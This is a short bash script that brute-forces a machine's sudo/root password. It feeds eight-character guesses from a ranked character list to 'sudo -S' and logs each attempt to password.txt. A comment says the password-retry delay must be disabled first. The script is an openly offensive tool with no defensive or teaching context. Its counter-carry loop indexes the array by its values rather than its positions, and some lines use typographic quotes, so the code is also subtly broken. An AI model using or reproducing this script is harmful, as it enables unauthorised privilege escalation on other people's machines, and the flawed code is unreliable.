#!/bin/bash
#to use, delay after incorrect root password must be disabled.
echo “password not yet found” > password.txt
pword=""
pind=( 0 0 0 0 0 0 0 0 )
chars=( e a o r i n s l 1 t 2 m d c y 0 b h g u p 3 k 9 4 5 7 6 8 f j w v z x S E A R M T B N O L I "" O D P H J q K G Y U F W V \! X @ Z " " \" \' \* \. Q - _ )
while true
do
	pword="${chars[${pind[0]}]}${chars[${pind[1]}]}${chars[${pind[2]}]}${chars[${pind[3]}]}${chars[${pind[4]}]}${chars[${pind[5]}]}${chars[${pind[6]}]}${chars[${pind[7]}]}"
	echo -e "trying: $pword"
	echo -e “password: $pword \n this is the password, if the hacker has finished. otherwise, this is just what the hacker is currently checking.” > password.txt
   	echo -e "$pword\n" | sudo -S killall test.sh
	(( pind[0]+=1 ))
	#sleep 0.5
	for i in ${pind[*]}
	do
		if [[ ${pind[i]} -gt 72 ]] ; then
			(( pind[i+1]+=1 ))
			pind[i]=0
		fi
	done
done
